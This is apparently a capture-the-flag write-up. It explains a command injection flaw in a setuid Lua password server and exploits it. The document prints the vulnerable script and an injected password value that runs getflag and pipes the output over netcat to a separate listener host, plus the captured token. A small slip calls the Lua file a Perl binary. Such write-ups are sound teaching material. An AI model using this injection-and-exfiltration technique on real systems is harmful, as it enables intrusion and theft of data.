## Step 1: Identifying the User

We begin by checking our current user informations:

```bash
$ id
uid=2011(level11) gid=2011(level11) groups=2011(level11),100(users)
```

This shows that we are operating as the user `level11`.

---
## Step 2: Searching for Files

```bash
$ ls -la
-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua


$ file level11.lua
level11.lua: setuid setgid a lua script, ASCII text executable
```
The level10 binary is a setuid perl executable, meaning it executes with flag11 user's privileges.


---
## Step 3: Analyze the Script

```bash
$ bat level11.lua

#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

### Explanation
The key vulnerability here is that the script does not sanitize user input when passing the password to the echo command in the hash function. This allows for command injection, where a malicious user can execute arbitrary commands on the server by crafting a special input string.

## Step 4: Exploiting the vulnerability
```bash
$ nc 127.0.0.1 5151
Password: $(echo $(getflag) | nc 192.168.0.2 4444)
```

### Listener Output
```bash
$ nc -lvnp 4444

Listening on 0.0.0.0 4444
Connection received on 192.168.0.25 46889
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
---

And there you have it, the token is `fa6v5ateaw21peobuub8ipe6s`.